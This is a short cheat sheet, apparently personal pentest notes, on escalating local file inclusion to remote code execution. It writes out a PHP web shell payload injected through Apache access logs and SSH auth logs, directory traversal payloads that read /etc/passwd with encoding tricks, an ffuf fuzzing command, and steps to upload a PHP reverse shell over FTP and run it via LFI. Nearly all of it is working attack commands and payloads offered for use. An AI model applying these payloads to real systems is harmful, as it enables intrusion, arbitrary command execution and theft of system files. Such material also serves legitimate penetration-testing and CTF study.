# LFI

If you locate an LFI, first try to get RCE.

## Log Poisoning

### 1) Locate a writable log file

    /var/log/apache2/access.log

### 2) Inject a payload

Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.

Payload:

    <?php echo system($_GET['cmd']); ?>

### 3) Execute via LFI

    http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami

## Alternate poisoning method: SSH Log Poisoning

### 1) Locate the log file

    /var/log/auth.log

### 2) Poison the auth.log file

Connect to SSH port via netcat

    nc -nv IP 22

Inject payload

    <?php echo system($_GET['cmd']); ?>

### 3) Run commands via your webshell now

    http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami

## Path Traversal manual payloads

Simple traversal: start with 

    ../../../../etc/passwd 

Try variants like : 

    ..//..//..//etc/passwd 
    
or 

    ..\/..\/..\/etc/passwd.

Dot+slash permutations: 

    ..././../ 
    
or 

    ..%2f..%2f..%2fetc/passwd (URL encoded).

Try Double-encoding: 

URL-encode twice if the app decodes input more than once (example: %252e%252e%252f = %2e%2e%2f).

## LFI to RCE by calling your uploaded reverse shell

If you have write access on an FTP server, you can upload your reverse shell, then call it with LFI to catch it.

### 1) Upload your reverse shell in a writable FTP share

    put php-reverse-shell.php

### 2) Using LFI, find the FTP configuration file to detect the share that your shell is uploaded.

Enumerate with ffuf

    ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -t 100 -u http://192.168.158.14/secret_information/?lang=FUZZ -fs 146

Read FTP configuration file

    http://domain.local/vulnerable.php?lang=/etc/vsftpd.conf

You might detect something like

    anon_root=/var/ftp write_enable=YES (If anonymous access is allowed for example.)

### 3) Enjoy your shell

    http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php
